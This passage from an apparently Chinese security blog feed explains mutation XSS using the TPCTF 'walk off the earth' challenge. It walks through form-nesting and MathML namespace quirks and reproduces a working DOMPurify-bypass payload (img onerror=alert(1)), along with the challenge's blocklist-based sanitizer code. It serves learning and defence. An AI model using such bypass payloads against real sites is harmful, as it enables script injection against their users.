punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到<code>flag</code>。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1709104679525.png" alt="1709104679525"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从TPCTF之walk off the earth看mXSS</title>
      <link href="/2023/12/04/mutation-xss-tu-bian-xss/"/>
      <url>/2023/12/04/mutation-xss-tu-bian-xss/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这次XCTF身为XSS垃圾的我果不其然又坐牢了，现在国际赛真的是一半以上都是XSS，看了看师傅的博客就是给了个payload，没有分析原理。今天就来学习一下mXSS。主要还是跟着<a href="https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass">这篇DOMPurify绕过</a>学习。</p></blockquote><h4 id="什么是mXSS"><a href="#什么是mXSS" class="headerlink" title="什么是mXSS"></a>什么是mXSS</h4><p><code>mXSS</code>的定义是</p><blockquote><p>如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。</p><p>随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。</p></blockquote><p>读完文章云里雾里的，但是看中文定义就有一点点懂了，感觉就是解析差异导致的问题。而这部分知识的难点我想就在于找到什么元素会造成解析差异。</p><p>此时我有一个疑问，为什么会存在解析差异问题？一般来说不就是把一段<code>html</code>标签交给浏览器解析从而生成<code>DOM</code>树最终渲染到页面上，哪来的另一个解析器？</p><p>然而我却忽视了需求，只站在渲染页面的角度上确实不需要额外的解析器，只需要浏览器一个解析器解析我们的<code>html</code>即可。我想会有从两个角度出发的需求：</p><ol><li>安全角度：输入是攻击者可控的，要想过滤一些危险标签或属性的话我们不可能等浏览器渲染完再搞事情吧，除非直接把浏览器<code>hook</code>了。这时候就需要引入过滤库，而想要过滤危险标签就必须先自己解析一遍。</li><li>调试角度：开发想要看自己开发的效果但是又不想渲染出来，每次看效果还得上浏览器看不方便，这时候可能也需要一个解析器来调试。</li></ol><p>从安全角度考虑的过滤组件<code>DOMPurify</code>流程如下：</p><pre><code>1.用户输入一段html文本。2.html被解析成DOM树。3.DOMPurify清理DOM树（该过程是遍历 DOM 树中的所有元素和属性，并删除不在允许列表中的所有节点）。4.DOM树被序列化回 HTML 标记以分配给document.innerHTML。5.浏览器再次解析 HTML 标记。6.DOM渲染。</code></pre><p>下面就来学习一下<code>bypass DOMPurify</code>必备的知识点。</p><h4 id="form表单嵌套"><a href="#form表单嵌套" class="headerlink" title="form表单嵌套"></a>form表单嵌套</h4><p><code>form</code>标签比较特殊。他不能嵌套自己。</p><p><a href="https://html.spec.whatwg.org/#the-form-element">https://html.spec.whatwg.org/#the-form-element</a></p><pre><code>Content model:Flow content, but with no form element descendants.大概意思就是form元素不能有form元素作为儿子节点，这是规矩。</code></pre><p>不信你就试试。反正我不信我试了。</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    nonono form<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>form1</span><span class="token punctuation">></span></span>        INSIDE_FORM1        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>form2</span><span class="token punctuation">></span></span>        INSIDE_FORM2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>That&#39;s cool,man.</code></p><p><code>form2</code>真的被浏览器君吃掉了。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701673837259.png" alt="1701673837259" width="25%" height="25%" /><p><code>form</code>无法嵌套创建的原因：<strong>当识别到 <code>form</code>标记时，解析器需要记录一下当前是使用表单元素指针打开的。只有指针为空的时候才可以继续创建表单元素，显然上述这种情况指针还是存在的。</strong></p><p>然后作者又提到了一个变异的<code>trick</code>可以搞一个嵌套，以下面为例：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    nonono form<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>outer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个就可以。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701674343414.png" alt="1701674343414" width="5%" height="5%" /><p>让我们跟着作者分析一下原因：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>outer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样可以嵌套的原因是：<strong>一开始，表单元素指针被设置成 id&#x3D;”outer”的指针。 然后识别一个div，接着碰到&#x2F;form结束标记将表单元素指针设置为 null。 因为表单指针现在是空的，所以可以创建下一个 id&#x3D;”inner” 的表单。注意，虽然第一个&#x2F;form结束了但实际上div在第一个form标签里，而第二个form在div标签里，也就是说在第一个form元素里。因此这样一个畸形结构是能达到嵌套的效果的。</strong></p><p>而此时生成的<code>DOM</code>树序列化后则变成：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>outer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果此时在用浏览器解析，因为第一个<code>outer</code>指针直到碰到了<code>inner</code>还是不为空，所以它就变成了：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>outer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这就造成了解析差异。</p><h4 id="命名空间混淆"><a href="#命名空间混淆" class="headerlink" title="命名空间混淆"></a>命名空间混淆</h4><p><code>HTML</code>解析器可以创建包含三个命名空间元素的<code>DOM</code>树：</p><ul><li><code>HTML</code>命名空间 ( <code>http://www.w3.org/1999/xhtml</code>)</li><li><code>SVG</code>命名空间 ( <code>http://www.w3.org/2000/svg</code>)</li><li><code>MathML</code>命名空间 ( <code>http://www.w3.org/1998/Math/MathML</code>)</li></ul><p>所有元素都位于<code>HTML</code>命名空间中；然而，如果解析器遇到<code>&lt;svg&gt;</code>or<code>&lt;math&gt;</code>元素，那么就会切换到<code>SVG</code>和<code>MathML</code>命名空间。这两个命名空间都会产生外来内容。</p><p>重点来了。</p><p><strong>在外来内容中，标记的解析方式与普通 HTML 中的解析方式不同，这也就导致了命名混淆问题。</strong>在<code>&lt;style&gt;</code>元素的解析上可以清楚地显示出来。在<code>HTML</code>命名空间中，<code>&lt;style&gt;</code>只能包含文本、没有子元素（后代节点），并且 HTML 实体不会被解码。然而在所谓的外部内容中情况就变了：外部内容中<code>&lt;style&gt;</code>可以具有子元素，并且实体编码会被解码。</p><p>从一个例子看命名混淆：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    命名混淆之子元素<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;a>ABC</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span>ABC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看看被渲染成了什么样。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701677604463.png" alt="1701677604463" width="5%" height="5%" /><p>第一个<code>style</code>里的<code>a</code>标签果然被当成了文本，但由于第二个<code>style</code>在<code>svg</code>中，切换了命名空间。因此这时候<code>a</code>标签会被渲染出来。</p><p><code>That&#39;s pretty cool,man.</code></p><p>到这里作者泼了冷水：</p><blockquote><p>如果我们在 <code>&lt;svg&gt;</code> 或 <code>&lt;math&gt;</code> 内部，那么理论上来说所有元素也都在非 <code>HTML</code> 命名空间中。然而事实并不是如此，<code>HTML</code> 规范中有一些元素称为<code>MathML</code> 文本集成点和 <code>HTML</code> 集成点。 这些元素的子元素具有 <code>HTML</code> 命名空间。</p></blockquote><p>再来看一个例子：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    Integration Point<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;a>ABC</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;a>ABC</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>math</code>标签的儿子<code>style</code>元素位于<code>MathML</code>命名空间中，而 <code>mtext</code> 中的<code>style</code>元素位于 <code>HTML</code>命名空间中。 这是因为<code>mtext</code>是 <code>MathML</code> 文本集成点，并使解析器切换命名空间。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701678240650.png" alt="1701678240650" width="5%" height="5%" /><p><a href="https://dev.w3.org/html5/spec-LC/tree-construction.html">集成点参考这个</a>：</p><p><strong>MathML:</strong></p><ol><li>mi</li><li>mo</li><li>mn</li><li>ms</li><li>mtext</li></ol><p><strong>HTML:</strong></p><ol><li>annotation-xml:如果其包含<code>encoding</code>属性，并且属性值等于<code>text/html</code>或者<code>application/xhtml+xml</code></li><li>svg foreignObject</li><li>svg desc</li><li>svg title</li></ol><p>然而，并不是集成点所有的子节点都具有<code>HTML</code>命名空间。有两个例外：<code>mglyph</code> 和 <code>malignmark</code>。 仅当它们是 <code>MathML</code> 文本集成点的直接子级时，才会发生这种情况。</p><p>举个例子。</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    Integration Point2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;a>ABC</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mglyph</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;a>ABC</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为<code>mglyph</code>是<code>mtext</code>的直接子元素，因此他的命名空间是<code>MathML</code>,所有他下面的<code>a</code>标签渲染出来了。而第二个<code>mglyph</code>是二级子节点，因此渲染不出来<code>a</code>标签，因为命名空间是<code>HTML</code>。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701679627566.png" alt="1701679627566" width="5%" height="5%" /><p>作者到这里整理一下判断不同命名空间的法则，我只能说这就是黑客吧（膜）：</p><ul><li>当前元素在其父元素的命名空间中，除非满足以下几点条件。</li><li>如果当前元素是&lt; svg&gt;或&lt; math&gt;，而父元素在HTML命名空间，那么当前元素分别在SVG或MathML命名空间。</li><li>如果当前元素的父元素是HTML集成点，则当前元素在HTML命名空间，除非是&lt; svg&gt;或&lt; math&gt;。</li><li>如果当前元素的父元素是MathML集成点，那么当前元素在HTML命名空间，除非它是&lt; svg&gt;、&lt; math&gt;、&lt; mglyph&gt;或&lt; malignmark&gt;。</li><li>如果当前元素是&lt; b&gt;、&lt; big&gt;、&lt; blockquote&gt;、&lt; body&gt;、&lt; br&gt;、&lt; center&gt;、&lt; code&gt;、&lt; dd&gt;、&lt; div&gt;、&lt; dl&gt;、&lt; dt&gt;、&lt; em&gt;、&lt; embed&gt;、&lt; h1&gt;之一。&lt; h2&gt;, &lt; h3&gt;, &lt; h4&gt;, &lt; h5&gt;, &lt; h6&gt;, &lt; head&gt;, &lt; hr&gt;, &lt; i&gt;, &lt; img&gt;, &lt; li&gt;, &lt; listing&gt;, &lt; menu&gt;, &lt; meta&gt;, &lt; nobr&gt;, &lt; ol&gt;, &lt; p&gt;, &lt; pre&gt;, &lt; ruby&gt;, &lt; s&gt;, &lt; small&gt;。&lt; span&gt;、&lt; strong&gt;、&lt; strike&gt;、&lt; sub&gt;、&lt; sup&gt;、&lt; table&gt;、&lt; tt&gt;、&lt; u&gt;、&lt; ul&gt;、&lt; var&gt;或&lt; font&gt;，并定义了颜色、面或大小属性，那么，堆栈上的所有元素都会被关闭，直到看到MathML文本整合点、HTML整合点或HTML命名空间中的元素。然后，当前元素也在HTML命名空间。</li></ul><h4 id="DOMPurify绕过"><a href="#DOMPurify绕过" class="headerlink" title="DOMPurify绕过"></a>DOMPurify绕过</h4><p>接着让我们看作者给的究极<code>payload</code>：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span>alert(1)</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个<code>payload</code>融合了<code>form</code>嵌套导致的解析问题以及命名空间混淆导致<code>svg</code>下面的<code>style</code>的子元素是文本。</p><p>第一次这个文本是会被解析成这样的：</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/6415e83558da0d64bdd9cf4211b0ed3.png" alt="6415e83558da0d64bdd9cf4211b0ed3" width="25%" height="25%" /><p>接下来着重讲一下为什么会变成这样子。</p><p>到第三层的<code>mtext</code>都没什么好说的，后面碰到了<code>/form</code>结尾导致指针清空，之后碰到<code>form</code>这也就导致可以<code>form</code>嵌套了。然后后面又放了个<code>mglyph</code>，这是最他妈牛逼的点。因为<code>mtext</code>是集成点，而下面的儿子是<code>form</code>，所以之后的都是<code>html</code>命名空间，包括<code>mglyph</code>，那么后面的<code>style</code>自然也不用说了他就是个<code>text</code>！！！！</p><p>既然是字符串的话是不会被<code>DOMPurify</code>解析的，上面这串东西无损的通过了<code>DOMPurify</code>过滤器随后序列化返回给<code>innerHTML</code>。</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;/math>&lt;img src onerror=<span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而被浏览器二次解析的时候猜猜会发生啥？</p><p>首先第二个<code>form</code>会被吃掉，因为标签没闭合。现在变成了这样：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;/math>&lt;img src onerror=<span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>现在这个<code>mglyph</code>成为<code>mtext</code>的儿子，那么就变成了<code>MATH</code>命名空间。而<code>style</code>此时也变成<code>MATH</code>命名空间。而这个<code>img</code>自然也就变成了标签。成功<code>XSS</code>。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/07d380258200443fda1dfc9823684a9.png" alt="07d380258200443fda1dfc9823684a9" width="25%" height="25%" /><h4 id="Walk-Off-The-Earth"><a href="#Walk-Off-The-Earth" class="headerlink" title="Walk Off The Earth"></a>Walk Off The Earth</h4><p>这题有三个考点。</p><p>第一个考点是绕过sha256比较，需要满足<strong>c5a5c0d64fab871c+???(你输入的字符串)的sha256开头是7个0</strong>。</p><p>这个就是原题啦。</p><pre><code>https://github.com/66Leo66/PoW-solver-rs</code></pre><p>第二点就是如何<code>xss</code>，这个就是个<code>mXSS</code>啦。因为用<code>JSDOM</code>解析了一次。</p><pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/note'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">sanitize</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">'No note!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">...</span><span class="token keyword">const</span> sanitize <span class="token operator">=</span> <span class="token punctuation">(</span>html<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> clean <span class="token operator">=</span> <span class="token function">custom_sanitize</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>    <span class="token keyword">return</span> clean<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">custom_sanitize</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> BLOCKED_TAG <span class="token operator">=</span> <span class="token regex">/(script|iframe|a|img|svg|audio|video)$/i</span>    <span class="token keyword">const</span> BLOCKED_ATTR <span class="token operator">=</span> <span class="token regex">/(href|src|on.+)/i</span>    <span class="token keyword">const</span> document <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSDOM</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>window<span class="token punctuation">.</span>document    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> html    <span class="token keyword">let</span> node<span class="token punctuation">;</span>    <span class="token keyword">const</span> iter <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createNodeIterator</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>body<span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Before sanitization:- "</span><span class="token operator">+</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>node <span class="token operator">=</span> iter<span class="token punctuation">.</span><span class="token function">nextNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>tagName<span class="token punctuation">)</span> <span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"The node is :-"</span><span class="token operator">+</span>node<span class="token punctuation">.</span>tagName<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>BLOCKED_TAG<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>tagName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"The blocked node is :-"</span><span class="token operator">+</span>node<span class="token punctuation">.</span>tagName<span class="token punctuation">)</span>                node<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"After eliminating blocked:- 